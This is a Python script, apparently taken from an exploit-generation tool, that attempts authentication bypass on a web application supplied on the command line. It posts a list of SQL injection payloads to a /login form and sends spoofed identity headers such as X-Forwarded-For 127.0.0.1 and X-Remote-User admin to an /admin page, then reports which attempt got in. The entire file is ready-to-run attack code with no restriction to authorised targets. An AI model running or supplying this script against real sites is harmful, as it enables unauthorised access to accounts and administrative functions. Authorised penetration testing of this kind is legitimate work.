"""
Authentication Bypass Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys


class AuthBypassExploit:
    """Authentication bypass exploitation class"""

    def __init__(self, target_url):
        """
        Initialize authentication bypass exploit

        Args:
            target_url: Base URL of target application
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def test_sql_auth_bypass(self):
        """
        Test SQL injection authentication bypass

        Returns:
            True if vulnerability found, False otherwise
        """
        print("[+] Testing SQL injection auth bypass...")

        bypass_payloads = [
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "') or '1'='1--",
            "admin' or '1'='1",
        ]

        for payload in bypass_payloads:
            try:
                data = {
                    "username": payload,
                    "password": "anything"
                }

                response = self.session.post(
                    f"{self.target_url}/login",
                    data=data
                )

                # Check for successful login indicators
                success_indicators = [
                    "dashboard", "welcome", "logout", "admin panel",
                    "successful", "redirect"
                ]

                if any(indicator in response.text.lower() for indicator in success_indicators):
                    print(f"[+] SQL injection bypass successful: {payload}")
                    return True

            except Exception as e:
                continue

        return False

    def test_header_bypass(self):
        """
        Test header-based authentication bypass

        Returns:
            True if vulnerability found, False otherwise
        """
        print("[+] Testing header-based auth bypass...")

        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Remote-User": "admin"},
            {"X-Forwarded-User": "admin"},
            {"Authorization": "Bearer admin"},
        ]

        for headers in bypass_headers:
            try:
                response = self.session.get(
                    f"{self.target_url}/admin",
                    headers=headers
                )

                if response.status_code == 200:
                    print(f"[+] Header bypass successful: {headers}")
                    return True

            except Exception as e:
                continue

        return False


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = AuthBypassExploit(target_url)

    print(f"[+] Authentication Bypass Exploit")
    print(f"[+] Target: {target_url}")

    success = False
    if exploit.test_sql_auth_bypass():
        print("[+] SQL injection authentication bypass confirmed!")
        success = True

    if exploit.test_header_bypass():
        print("[+] Header-based authentication bypass confirmed!")
        success = True

    if not success:
        print("[-] No authentication bypass found")


if __name__ == "__main__":
    main()
